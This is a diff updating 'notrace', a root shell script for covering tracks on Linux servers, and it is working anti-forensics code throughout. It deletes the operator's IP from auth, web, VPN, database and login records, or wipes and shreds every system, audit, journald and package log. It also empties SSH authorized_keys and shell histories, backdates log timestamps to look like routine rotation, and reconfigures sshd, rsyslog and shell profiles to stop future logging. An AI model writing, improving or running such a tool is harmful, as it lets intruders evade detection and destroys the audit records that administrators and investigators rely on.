@@ -1,7 +1,7 @@
-#!/usr/bin/env bash
-set -euo pipefail
+#!/bin/sh
+set -e
 
-VERSION="1.0.0"
+VERSION="1.1.0"
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -9,16 +9,16 @@ YELLOW='\033[1;33m'
 CYAN='\033[0;36m'
 NC='\033[0m'
 
-info()  { echo -e "${GREEN}[✓]${NC} $1"; }
-warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
-error() { echo -e "${RED}[✗]${NC} $1"; exit 1; }
-header() { echo -e "\n${CYAN}=== $1 ===${NC}"; }
+info()   { printf "${GREEN}[✓]${NC} %s\n" "$1"; }
+warn()   { printf "${YELLOW}[!]${NC} %s\n" "$1"; }
+error()  { printf "${RED}[✗]${NC} %s\n" "$1"; exit 1; }
+header() { printf "\n${CYAN}=== %s ===${NC}\n" "$1"; }
 
 usage() {
     cat <<EOF
 notrace v${VERSION} - Server trace cleaner
 
-Usage: sudo bash notrace.sh [OPTION]
+Usage: sudo sh notrace.sh [OPTION]
 
 Options:
   --self    Clean only YOUR access traces (auto-detect from SSH_CLIENT)
@@ -26,43 +26,56 @@ Options:
   --help    Show this help message
 
 Examples:
-  curl -fsSL URL/notrace.sh | sudo bash
-  curl -fsSL URL/notrace.sh | sudo bash -s -- --all
+  curl -fsSL URL/notrace.sh | sudo sh
+  curl -fsSL URL/notrace.sh | sudo sh -s -- --all
 EOF
     exit 0
 }
 
 check_root() {
-    if [[ $EUID -ne 0 ]]; then
+    if [ "$(id -u)" -ne 0 ]; then
         error "This script must be run as root (use sudo)"
     fi
 }
 
 detect_os() {
-    if [[ -f /etc/os-release ]]; then
+    OS=""
+    OS_FAMILY=""
+    if [ -f /etc/os-release ]; then
         . /etc/os-release
-        OS=$ID
-        OS_LIKE=${ID_LIKE:-}
-    else
-        OS=$(uname -s)
+        OS="$ID"
+        OS_LIKE="${ID_LIKE:-}"
+    fi
+    if [ -z "$OS" ]; then
+        OS=$(uname -s 2>/dev/null || echo "unknown")
     fi
 
     case "$OS" in
-        ubuntu|debian|linuxmint|pop|elementary|kali)
+        ubuntu|debian|linuxmint|pop|elementary|kali|neon|deepin|uos)
             OS_FAMILY="debian" ;;
-        centos|rhel|fedora|rocky|almalinux|ol|amzn)
+        centos|rhel|fedora|rocky|almalinux|ol|amzn|oracle)
             OS_FAMILY="rhel" ;;
-        arch|manjaro|endeavouros|artix)
+        arch|manjaro|endeavouros|artix|archarm|garuda)
             OS_FAMILY="arch" ;;
-        suse|opensuse*|sles)
+        suse|opensuse*|sles|opensuse-tumbleweed)
             OS_FAMILY="suse" ;;
         alpine)
             OS_FAMILY="alpine" ;;
+        gentoo|funtoo)
+            OS_FAMILY="gentoo" ;;
+        void)
+            OS_FAMILY="void" ;;
+        slackware)
+            OS_FAMILY="slackware" ;;
         *)
-            if echo "$OS_LIKE" | grep -qi "debian"; then
-                OS_FAMILY="debian"
-            elif echo "$OS_LIKE" | grep -qiE "rhel|fedora|centos"; then
-                OS_FAMILY="rhel"
+            if [ -n "$OS_LIKE" ]; then
+                case "$OS_LIKE" in
+                    *debian*)  OS_FAMILY="debian" ;;
+                    *rhel*|*fedora*|*centos*) OS_FAMILY="rhel" ;;
+                    *arch*)    OS_FAMILY="arch" ;;
+                    *suse*)    OS_FAMILY="suse" ;;
+                    *)         OS_FAMILY="unknown" ;;
+                esac
             else
                 OS_FAMILY="unknown"
             fi ;;
@@ -71,21 +84,60 @@ detect_os() {
     info "Detected OS: $OS (family: ${OS_FAMILY:-unknown})"
 }
 
-safe_truncate() {
-    local file="$1"
-    if [[ -f "$file" ]]; then
-        : > "$file" 2>/dev/null || true
-    fi
+# ── Helpers ──────────────────────────────────
+
+# These log dirs are checked by both modes
+get_log_search_dirs() {
+    cat <<DIRS
+/var/log/nginx
+/var/log/httpd
+/var/log/apache2
+/var/log/apache
+/var/log/caddy
+/var/log/traefik
+/var/log/openvpn
+/var/log/wireguard
+/var/log/strongswan
+/var/log/ipsec
+/var/log/ocserv
+/var/log/vsftpd
+/var/log/proftpd
+/var/log/samba
+/var/log/mysql
+/var/log/mariadb
+/var/log/postgresql
+/var/log/postgres
+/var/log/pgsql
+/var/log/mongodb
+/var/log/mongod
+/var/log/redis
+/var/log/fail2ban
+/var/log/audit
+/var/log/aliyun
+/var/log/amazon
+/var/log/aws
+/var/log/azure
+/var/log/google
+/var/log/tencent
+/var/log/ufw
+/var/log/firewalld
+/var/log/iptables
+/var/log/portage
+DIRS
 }
 
-safe_shred() {
-    local file="$1"
-    if [[ ! -f "$file" ]]; then
-        return
-    fi
-    if command -v shred &>/dev/null; then
+truncate_file() {
+    file="$1"
+    [ -f "$file" ] || return 0
+    : > "$file" 2>/dev/null || true
+}
+
+shred_file() {
+    file="$1"
+    [ -f "$file" ] || return 0
+    if command -v shred >/dev/null 2>&1; then
         shred -fzu "$file" 2>/dev/null || rm -f "$file" 2>/dev/null || true
-    elif command -v dd &>/dev/null; then
+    elif command -v dd >/dev/null 2>&1; then
         dd if=/dev/zero of="$file" bs=1M 2>/dev/null || true
         rm -f "$file" 2>/dev/null || true
     else
@@ -94,16 +146,13 @@ safe_shred() {
     fi
 }
 
-remove_lines_with_ip() {
-    local file="$1"
-    local ip="$2"
-    if [[ ! -f "$file" ]]; then
-        return
-    fi
-    local tmp
-    tmp=$(mktemp)
+remove_ip_lines() {
+    file="$1"
+    ip="$2"
+    [ -f "$file" ] || return 0
+    tmp=$(mktemp 2>/dev/null || mktemp -t notrace.XXXXXX)
     if grep -vF "$ip" "$file" > "$tmp" 2>/dev/null; then
-        if [[ -s "$tmp" ]]; then
+        if [ -s "$tmp" ]; then
             cat "$tmp" > "$file" 2>/dev/null || true
         else
             : > "$file" 2>/dev/null || true
@@ -112,295 +161,365 @@ remove_lines_with_ip() {
     rm -f "$tmp" 2>/dev/null || true
 }
 
+filter_wtmp_ip() {
+    wfile="$1"
+    ip="$2"
+    [ -f "$wfile" ] || return 0
+    if command -v utmpdump >/dev/null 2>&1; then
+        tmp=$(mktemp 2>/dev/null || mktemp -t notrace.XXXXXX)
+        utmpdump "$wfile" 2>/dev/null | grep -vF "$ip" > "$tmp" 2>/dev/null || true
+        if [ -s "$tmp" ]; then
+            utmpdump -r < "$tmp" > "$wfile" 2>/dev/null || : > "$wfile" 2>/dev/null || true
+        else
+            : > "$wfile" 2>/dev/null || true
+        fi
+        rm -f "$tmp" 2>/dev/null || true
+    else
+        : > "$wfile" 2>/dev/null || true
+    fi
+}
+
+detect_client_ip() {
+    ip=""
+    if [ -n "${SSH_CLIENT:-}" ]; then
+        ip=$(echo "$SSH_CLIENT" | awk '{print $1}')
+    elif [ -n "${SSH_CONNECTION:-}" ]; then
+        ip=$(echo "$SSH_CONNECTION" | awk '{print $1}')
+    elif command -v who >/dev/null 2>&1; then
+        ip=$(who -m 2>/dev/null | awk '{print $NF}' | tr -d '()')
+    fi
+    echo "$ip"
+}
+
+clear_history_files() {
+    for home_dir in /root /home/*; do
+        [ -d "$home_dir" ] || continue
+        for hf in .bash_history .sh_history .zsh_history \
+                  .mysql_history .psql_history .pg_history \
+                  .python_history .python_repl_history \
+                  .node_repl_history .rediscli_history \
+                  .mongosh_history .sqlite_history \
+                  .viminfo .lesshst .nano_history .zsh_sessions \
+                  .irb_history .pry_history .Rhistory .Rapp.history; do
+            [ -f "$home_dir/$hf" ] && : > "$home_dir/$hf" 2>/dev/null || true
+        done
+    done
+    if command -v history >/dev/null 2>&1; then
+        history -c 2>/dev/null || true
+    fi
+    : > /root/.bash_history 2>/dev/null || true
+    export HISTFILE=/dev/null
+}
+
+clear_app_caches() {
+    for home_dir in /root /home/*; do
+        [ -d "$home_dir" ] || continue
+        [ -f "$home_dir/.pip/pip.log" ] && shred_file "$home_dir/.pip/pip.log"
+        [ -d "$home_dir/.npm/_logs" ] && rm -rf "$home_dir/.npm/_logs" 2>/dev/null || true
+        [ -d "$home_dir/.npm/_cacache" ] && rm -rf "$home_dir/.npm/_cacache" 2>/dev/null || true
+        [ -f "$home_dir/.wget-hsts" ] && shred_file "$home_dir/.wget-hsts"
+        [ -f "$home_dir/.curlrc" ] && shred_file "$home_dir/.curlrc"
+    done
+}
+
+wipe_log_dir() {
+    dir="$1"
+    [ -d "$dir" ] || return 0
+    for f in "$dir"/*; do
+        [ -f "$f" ] && truncate_file "$f"
+    done
+}
+
 # ──────────────────────────────────────────────
-#  --self  Only clean YOUR traces
+#  --self
 # ──────────────────────────────────────────────
 self_clean() {
     header "Mode: Self-clean (your traces only)"
 
-    if [[ -z "${SSH_CLIENT:-}" ]]; then
-        warn "SSH_CLIENT not set — are you logged in via SSH?"
+    MY_IP=$(detect_client_ip)
+    if [ -z "$MY_IP" ]; then
+        warn "Could not auto-detect your IP via SSH_CLIENT or who -m"
         warn "Skipping IP-specific log cleanup."
-        MY_IP=""
     else
-        MY_IP=$(echo "$SSH_CLIENT" | awk '{print $1}')
         info "Detected your IP: $MY_IP"
     fi
 
-    if [[ -n "$MY_IP" ]]; then
-        # ── Auth logs ──
-        if [[ "$OS_FAMILY" == "debian" ]]; then
-            for f in /var/log/auth.log /var/log/auth.log.* /var/log/auth.log-*; do
-                remove_lines_with_ip "$f" "$MY_IP"
-            done
-            info "Cleaned auth.log"
-        else
-            for f in /var/log/secure /var/log/secure-*; do
-                remove_lines_with_ip "$f" "$MY_IP"
-            done
-            info "Cleaned /var/log/secure"
+    if [ -n "$MY_IP" ]; then
+        # Auth logs by OS family
+        case "$OS_FAMILY" in
+            debian)
+                for f in /var/log/auth.log /var/log/auth.log.* /var/log/auth.log-*; do
+                    remove_ip_lines "$f" "$MY_IP"
+                done ;;
+            rhel|amzn)
+                for f in /var/log/secure /var/log/secure-*; do
+                    remove_ip_lines "$f" "$MY_IP"
+                done ;;
+            alpine|gentoo|void)
+                for f in /var/log/auth.log /var/log/auth.log.* /var/log/secure /var/log/secure-*; do
+                    remove_ip_lines "$f" "$MY_IP"
+                done ;;
+        esac
+        info "Auth logs cleaned"
+
+        # Web server logs
+        for dir in /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache \
+                   /var/log/caddy /var/log/traefik; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        info "Web server logs cleaned"
+
+        # VPN logs
+        for dir in /var/log/openvpn /var/log/wireguard /var/log/strongswan \
+                   /var/log/ipsec /var/log/ocserv; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        info "VPN logs cleaned"
+
+        # FTP logs
+        for dir in /var/log/vsftpd /var/log/proftpd; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        [ -f /var/log/xferlog ] && remove_ip_lines /var/log/xferlog "$MY_IP"
+        [ -f /var/log/pureftpd.log ] && remove_ip_lines /var/log/pureftpd.log "$MY_IP"
+
+        # Samba logs
+        if [ -d /var/log/samba ]; then
+            for f in /var/log/samba/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
         fi
 
-        # ── HTTP logs ──
-        for logdir in /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache; do
-            if [[ -d "$logdir" ]]; then
-                for f in "$logdir"/*; do
-                    [[ -f "$f" ]] && remove_lines_with_ip "$f" "$MY_IP"
-                done
-                info "Cleaned $logdir"
-            fi
-        done
-
-        # ── VPN logs ──
-        for logdir in /var/log/openvpn /var/log/wireguard; do
-            if [[ -d "$logdir" ]]; then
-                for f in "$logdir"/*; do
-                    [[ -f "$f" ]] && remove_lines_with_ip "$f" "$MY_IP"
-                done
-                info "Cleaned $logdir"
-            fi
-        done
-
-        # ── System text logs ──
+        # System text logs
         for f in /var/log/messages /var/log/syslog /var/log/kern.log /var/log/debug \
                  /var/log/daemon.log /var/log/user.log /var/log/mail.log \
                  /var/log/mail.err /var/log/mail.warn /var/log/cron.log \
-                 /var/log/boot.log /var/log/cloud-init.log /var/log/cloud-init-output.log; do
-            remove_lines_with_ip "$f" "$MY_IP"
+                 /var/log/boot.log /var/log/cloud-init.log /var/log/cloud-init-output.log \
+                 /var/log/firewalld /var/log/ufw.log; do
+            remove_ip_lines "$f" "$MY_IP"
         done
-        info "Cleaned system logs"
+        info "System logs cleaned"
 
-        # ── Binary login records (wtmp / btmp / lastlog) ──
-        if command -v utmpdump &>/dev/null; then
-            for wfile in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
-                if [[ -f "$wfile" ]]; then
-                    local tmp
-                    tmp=$(mktemp)
-                    utmpdump "$wfile" 2>/dev/null | grep -vF "$MY_IP" > "$tmp" 2>/dev/null || true
-                    if [[ -s "$tmp" ]]; then
-                        if utmpdump -r < "$tmp" > "$wfile" 2>/dev/null; then
-                            :
-                        else
-                            : > "$wfile" 2>/dev/null || true
-                        fi
-                    else
-                        : > "$wfile" 2>/dev/null || true
-                    fi
-                    rm -f "$tmp" 2>/dev/null || true
-                fi
-            done
-            info "Filtered binary login records (wtmp/btmp/lastlog)"
-        else
-            for wfile in /var/log/wtmp /var/log/btmp; do
-                [[ -f "$wfile" ]] && : > "$wfile" 2>/dev/null || true
-            done
-            warn "utmpdump not found — wtmp/btmp truncated (all records lost)"
-        fi
+        # Binary login records
+        filter_wtmp_ip /var/log/wtmp "$MY_IP"
+        filter_wtmp_ip /var/log/btmp "$MY_IP"
+        filter_wtmp_ip /var/log/lastlog "$MY_IP"
+        command -v faillog >/dev/null 2>&1 && faillog -r 2>/dev/null || true
+        info "Login records cleaned"
 
-        # ── clear faillog ──
-        command -v faillog &>/dev/null && faillog -r 2>/dev/null || true
-    fi
+        # DB logs
+        for dir in /var/log/mysql /var/log/mariadb /var/log/postgresql \
+                   /var/log/postgres /var/log/pgsql /var/log/mongodb \
+                   /var/log/mongod /var/log/redis; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        info "Database logs cleaned"
 
-    # ── Bash history ──
-    history -c 2>/dev/null || true
-    : > ~/.bash_history 2>/dev/null || true
-    if [[ -f /root/.bash_history ]]; then
-        : > /root/.bash_history
-    fi
-
-    # Clean history in other users' homes that might contain our IP
-    if [[ -n "$MY_IP" ]]; then
-        for home in /home/*; do
-            [[ -f "$home/.bash_history" ]] && remove_lines_with_ip "$home/.bash_history" "$MY_IP" || true
+        # Cloud agent logs
+        for f in /var/log/aliyun* /var/log/aws* /var/log/amazon/* /var/log/waagent.log \
+                 /var/log/azure/* /var/log/google* /var/log/tencent* /var/log/oracle-cloud-agent/*; do
+            [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"
         done
     fi
 
-    export HISTFILE=/dev/null
-
-    # ── Application histories ──
-    for home in /root /home/*; do
-        [[ -d "$home" ]] || continue
-        for hf in .mysql_history .psql_history .python_history .node_repl_history \
-                  .rediscli_history .viminfo .lesshst .nano_history; do
-            [[ -f "$home/$hf" ]] && : > "$home/$hf" 2>/dev/null || true
+    clear_history_files
+    if [ -n "$MY_IP" ]; then
+        for home_dir in /home/*; do
+            [ -f "$home_dir/.bash_history" ] && remove_ip_lines "$home_dir/.bash_history" "$MY_IP" || true
         done
-    done
-    info "Application histories cleared"
+    fi
+    info "History files cleaned"
 
     info "Self-clean complete! Your traces have been removed."
 }
 
 # ──────────────────────────────────────────────
-#  --all  Total system wipe
+#  --all
 # ──────────────────────────────────────────────
 total_wipe() {
     header "Mode: Total wipe (complete system cleanse)"
 
-    # [1] System logs
+    # ── [1] System logs ──
     header "[1/5] Clearing system logs"
 
-    local syslogs=(
-        /var/log/messages /var/log/messages-*
-        /var/log/syslog /var/log/syslog-*
-        /var/log/kern.log /var/log/kern.log.*
-        /var/log/debug /var/log/debug-*
-        /var/log/daemon.log /var/log/daemon.log.*
-        /var/log/user.log /var/log/user.log.*
-        /var/log/mail.log /var/log/mail.log.*
-        /var/log/mail.err /var/log/mail.warn
-        /var/log/cron.log /var/log/cron-*
-        /var/log/boot.log /var/log/boot.log.*
-        /var/log/dmesg /var/log/dmesg.*
-        /var/log/faillog
-        /var/log/lastlog
-        /var/log/wtmp /var/log/wtmp-*
-        /var/log/btmp /var/log/btmp-*
-    )
-    for log in "${syslogs[@]}"; do
-        safe_truncate "$log"
+    for f in /var/log/messages /var/log/messages-* \
+             /var/log/syslog /var/log/syslog-* \
+             /var/log/kern.log /var/log/kern.log.* \
+             /var/log/debug /var/log/debug-* \
+             /var/log/daemon.log /var/log/daemon.log.* \
+             /var/log/user.log /var/log/user.log.* \
+             /var/log/mail.log /var/log/mail.log.* \
+             /var/log/mail.err /var/log/mail.warn \
+             /var/log/cron.log /var/log/cron-* \
+             /var/log/boot.log /var/log/boot.log.* \
+             /var/log/dmesg /var/log/dmesg.* \
+             /var/log/faillog /var/log/lastlog \
+             /var/log/wtmp /var/log/wtmp-* \
+             /var/log/btmp /var/log/btmp-*; do
+        truncate_file "$f"
     done
 
-    if [[ "$OS_FAMILY" == "debian" ]]; then
-        for f in /var/log/auth.log /var/log/auth.log.*; do safe_truncate "$f"; done
-    else
-        for f in /var/log/secure /var/log/secure-*; do safe_truncate "$f"; done
-    fi
-    info "System logs truncated"
+    case "$OS_FAMILY" in
+        debian|alpine|gentoo|void)
+            for f in /var/log/auth.log /var/log/auth.log.* /var/log/auth.log-*; do
+                truncate_file "$f"
+            done ;;
+        rhel|amzn)
+            for f in /var/log/secure /var/log/secure-*; do
+                truncate_file "$f"
+            done ;;
+    esac
 
-    for logdir in /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache \
-                  /var/log/openvpn /var/log/wireguard; do
-        if [[ -d "$logdir" ]]; then
-            for f in "$logdir"/*; do [[ -f "$f" ]] && safe_truncate "$f"; done
-            info "Cleaned $logdir"
-        fi
+    # Wipe all known log directories
+    for dir in $(get_log_search_dirs); do
+        wipe_log_dir "$dir"
     done
 
-    if command -v docker &>/dev/null; then
+    # Also search for any .log files in /var/log that might be custom apps
+    find /var/log -maxdepth 2 -type f -name "*.log" 2>/dev/null | while read -r f; do
+        truncate_file "$f"
+    done
+    info "System logs cleared"
+
+    # Docker
+    if command -v docker >/dev/null 2>&1; then
         docker ps -q 2>/dev/null | while read -r cid; do
-            local logpath
             logpath=$(docker inspect --format='{{.LogPath}}' "$cid" 2>/dev/null) || continue
             truncate -s 0 "$logpath" 2>/dev/null || true
         done
         info "Docker logs cleared"
     fi
 
-    if command -v journalctl &>/dev/null; then
+    # Journald
+    if command -v journalctl >/dev/null 2>&1; then
         journalctl --rotate 2>/dev/null || true
         journalctl --vacuum-size=0 --vacuum-time=1s 2>/dev/null || true
         info "Journald logs cleared"
     fi
 
-    for f in /var/log/audit/audit.log /var/log/audit/audit.log.*; do
-        safe_truncate "$f"
-    done
-    info "Audit logs cleared"
-
-    safe_truncate /var/log/cloud-init.log
-    safe_truncate /var/log/cloud-init-output.log
-
-    # [2] Package manager logs
+    # ── [2] Package manager logs ──
     header "[2/5] Clearing installation records"
 
-    local pkg_logs=()
     case "$OS_FAMILY" in
         debian)
-            pkg_logs=( /var/log/dpkg.log /var/log/dpkg.log.* /var/log/apt/history.log /var/log/apt/history.log.* /var/log/apt/term.log /var/log/apt/term.log.* /var/log/bootstrap.log )
-            rm -rf /var/log/installer 2>/dev/null || true
-            ;;
+            for f in /var/log/dpkg.log /var/log/dpkg.log.* /var/log/apt/history.log \
+                     /var/log/apt/history.log.* /var/log/apt/term.log /var/log/apt/term.log.* \
+                     /var/log/bootstrap.log; do
+                shred_file "$f"
+            done
+            rm -rf /var/log/installer 2>/dev/null || true ;;
         rhel)
-            pkg_logs=( /var/log/yum.log /var/log/yum.log.* /var/log/dnf.log /var/log/dnf.log.* /var/log/dnf.rpm.log /var/log/dnf.rpm.log.* /var/log/dnf.transaction.log /var/log/dnf.transaction.log.* )
-            ;;
+            for f in /var/log/yum.log /var/log/yum.log.* /var/log/dnf.log /var/log/dnf.log.* \
+                     /var/log/dnf.rpm.log /var/log/dnf.rpm.log.* /var/log/dnf.transaction.log \
+                     /var/log/dnf.transaction.log.*; do
+                shred_file "$f"
+            done ;;
         arch)
-            pkg_logs=( /var/log/pacman.log /var/log/pacman.log.* )
-            ;;
+            for f in /var/log/pacman.log /var/log/pacman.log.*; do
+                shred_file "$f"
+            done ;;
         suse)
-            pkg_logs=( /var/log/zypper.log /var/log/zypper.log.* /var/log/zypp/history /var/log/zypp/history.* )
-            ;;
+            for f in /var/log/zypper.log /var/log/zypper.log.* /var/log/zypp/history \
+                     /var/log/zypp/history.*; do
+                shred_file "$f"
+            done ;;
+        alpine)
+            for f in /var/log/apk/*; do
+                [ -f "$f" ] && shred_file "$f"
+            done ;;
+        gentoo)
+            for f in /var/log/emerge.log /var/log/emerge-fetch.log; do
+                shred_file "$f"
+            done
+            rm -rf /var/log/portage 2>/dev/null || true ;;
     esac
-
-    for log in "${pkg_logs[@]}"; do
-        safe_shred "$log"
-    done
     info "Package manager logs removed"
 
-    for home in /root /home/*; do
-        [[ -d "$home" ]] || continue
-        [[ -f "$home/.pip/pip.log" ]] && safe_shred "$home/.pip/pip.log"
-        [[ -d "$home/.npm/_logs" ]] && rm -rf "$home/.npm/_logs" 2>/dev/null || true
-        [[ -d "$home/.npm/_cacache" ]] && rm -rf "$home/.npm/_cacache" 2>/dev/null || true
-        [[ -f "$home/.wget-hsts" ]] && safe_shred "$home/.wget-hsts"
-    done
+    clear_app_caches
     info "User package caches cleared"
 
-    # [3] History
+    # ── [3] History ──
     header "[3/5] Clearing command and application history"
+    clear_history_files
 
-    for home in /root /home/*; do
-        [[ -f "$home/.bash_history" ]] && : > "$home/.bash_history" 2>/dev/null || true
+    for home_dir in /root /home/*; do
+        [ -d "$home_dir" ] || continue
+        [ -f "$home_dir/.ssh/known_hosts" ] && : > "$home_dir/.ssh/known_hosts" 2>/dev/null || true
+        [ -f "$home_dir/.ssh/authorized_keys" ] && : > "$home_dir/.ssh/authorized_keys" 2>/dev/null || true
     done
-    history -c 2>/dev/null || true
-    : > ~/.bash_history 2>/dev/null || true
-    export HISTFILE=/dev/null
-    info "Bash history cleared for all users"
+    info "SSH traces cleared"
 
-    local history_files=(
-        .mysql_history .psql_history .pg_history
-        .python_history .python_repl_history
-        .node_repl_history
-        .rediscli_history
-        .mongosh_history
-        .sqlite_history
-        .viminfo .vim/.viminfo
-        .lesshst .nano_history
-        .zsh_history .zsh_sessions
-        .irb_history .pry_history
-        .Rhistory .Rapp.history
-    )
-
-    for home in /root /home/*; do
-        [[ -d "$home" ]] || continue
-        for hf in "${history_files[@]}"; do
-            [[ -f "$home/$hf" ]] && : > "$home/$hf" 2>/dev/null || true
-        done
-        [[ -f "$home/.ssh/known_hosts" ]] && : > "$home/.ssh/known_hosts" 2>/dev/null || true
-    done
-    info "Application histories and SSH known_hosts cleared"
-
-    # [4] Timestamp spoofing
+    # ── [4] Timestamp spoofing ──
     header "[4/5] Spoofing timestamps"
 
-    local past_date="3 days ago"
-    for logdir in /var/log /var/log/nginx /var/log/httpd /var/log/apache2 \
-                  /var/log/apache /var/log/openvpn /var/log/wireguard \
-                  /var/log/audit /var/log/apt /var/log/zypp; do
-        if [[ -d "$logdir" ]]; then
-            find "$logdir" -type f -exec touch -d "$past_date" {} \; 2>/dev/null || true
+    touch_cmd="touch -d \"3 days ago\""
+    if ! touch -d "3 days ago" /tmp/.notrace_test 2>/dev/null; then
+        touch_cmd="touch -t $(date -d '3 days ago' '+%Y%m%d%H%M.%S' 2>/dev/null || echo '200001010000.00')"
+        # fallback: no date manipulation
+        if [ "$touch_cmd" = 'touch -t 200001010000.00' ]; then
+            touch_cmd="touch"
+        fi
+    fi
+    rm -f /tmp/.notrace_test 2>/dev/null || true
+
+    for dir in /var/log /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache \
+               /var/log/openvpn /var/log/wireguard /var/log/audit /var/log/apt \
+               /var/log/zypp /var/log/mysql /var/log/mariadb /var/log/postgresql \
+               /var/log/mongodb /var/log/redis; do
+        if [ -d "$dir" ]; then
+            find "$dir" -type f -exec $touch_cmd {} \; 2>/dev/null || true
         fi
     done
     info "Timestamps spoofed (appear as normal log rotation)"
 
-    # [5] Block future logging
+    # ── [5] Block future logging ──
     header "[5/5] Blocking future logging"
 
-    local sshd_config="/etc/ssh/sshd_config"
-    if [[ -f "$sshd_config" ]]; then
-        if grep -q "^LogLevel" "$sshd_config" 2>/dev/null; then
-            sed -i 's/^LogLevel.*/LogLevel QUIET/' "$sshd_config" 2>/dev/null || true
+    # SSH: LogLevel QUIET
+    if [ -f /etc/ssh/sshd_config ]; then
+        if grep -q "^LogLevel" /etc/ssh/sshd_config 2>/dev/null; then
+            sed -i 's/^LogLevel.*/LogLevel QUIET/' /etc/ssh/sshd_config 2>/dev/null || true
         else
-            echo "LogLevel QUIET" >> "$sshd_config" 2>/dev/null || true
+            echo "LogLevel QUIET" >> /etc/ssh/sshd_config 2>/dev/null || true
         fi
-        info "SSH LogLevel set to QUIET (requires sshd restart)"
+        info "SSH LogLevel set to QUIET"
     fi
 
-    local rsyslog_file="/etc/rsyslog.d/00-notrace.conf"
-    if command -v rsyslogd &>/dev/null && [[ -d /etc/rsyslog.d ]]; then
-        cat > "$rsyslog_file" 2>/dev/null || true
-        systemctl restart rsyslog 2>/dev/null || service rsyslog restart 2>/dev/null || true
+    # Rsyslog: suppress auth logging
+    if command -v rsyslogd >/dev/null 2>&1 && [ -d /etc/rsyslog.d ]; then
+        cat > /etc/rsyslog.d/00-notrace.conf <<'RSCONF' 2>/dev/null || true
+authpriv.none  /var/log/auth.log
+authpriv.*     ~
+RSCONF
+        if command -v systemctl >/dev/null 2>&1; then
+            systemctl restart rsyslog 2>/dev/null || true
+        elif command -v service >/dev/null 2>&1; then
+            service rsyslog restart 2>/dev/null || true
+        elif command -v rc-service >/dev/null 2>&1; then
+            rc-service rsyslog restart 2>/dev/null || true
+        fi
         info "Rsyslog configured to suppress auth logging"
     fi
 
-    for rcfile in /etc/profile /etc/bashrc /etc/bash.bashrc /root/.bashrc; do
-        if [[ -f "$rcfile" ]] && ! grep -q "HISTSIZE=0" "$rcfile" 2>/dev/null; then
+    # Busybox syslogd (Alpine)
+    if command -v syslogd >/dev/null 2>&1 && [ -f /etc/syslog.conf ]; then
+        echo "auth.* /dev/null" >> /etc/syslog.conf 2>/dev/null || true
+        if command -v rc-service >/dev/null 2>&1; then
+            rc-service syslogd restart 2>/dev/null || true
+        fi
+        info "Busybox syslogd configured to suppress auth logging"
+    fi
+
+    # Disable command history system-wide
+    for rcfile in /etc/profile /etc/bashrc /etc/bash.bashrc /etc/zsh/zshrc \
+                  /root/.bashrc /root/.zshrc; do
+        if [ -f "$rcfile" ] && ! grep -q "HISTSIZE=0" "$rcfile" 2>/dev/null; then
             {
                 echo ""
                 echo "# notrace: disable command history"
@@ -412,33 +531,32 @@ total_wipe() {
     info "Command history disabled system-wide"
 
     info "Total wipe complete!"
-    warn "SSH changes require: systemctl restart sshd (safe to run later)"
+    warn "SSH changes require: systemctl restart sshd (safe to run later when disconnected)"
 }
 
 # ══════════════════════════════════════════════
 #  Main
 # ══════════════════════════════════════════════
 main() {
-    echo -e "${CYAN}╔══════════════════════╗${NC}"
-    echo -e "${CYAN}║   notrace v${VERSION}   ║${NC}"
-    echo -e "${CYAN}╚══════════════════════╝${NC}"
+    printf "${CYAN}╔══════════════════════╗${NC}\n"
+    printf "${CYAN}║   notrace v%s   ║${NC}\n" "$VERSION"
+    printf "${CYAN}╚══════════════════════╝${NC}\n"
+
+    case "${1:-}" in
+        --help|-h)
+            usage ;;
+    esac
 
     check_root
     detect_os
 
     case "${1:-}" in
         --all|-a)
-            total_wipe
-            ;;
+            total_wipe ;;
         --self|-s|"")
-            self_clean
-            ;;
-        --help|-h)
-            usage
-            ;;
+            self_clean ;;
         *)
-            error "Unknown option: $1. Use --help for usage."
-            ;;
+            error "Unknown option: $1. Use --help for usage." ;;
     esac
 }
 
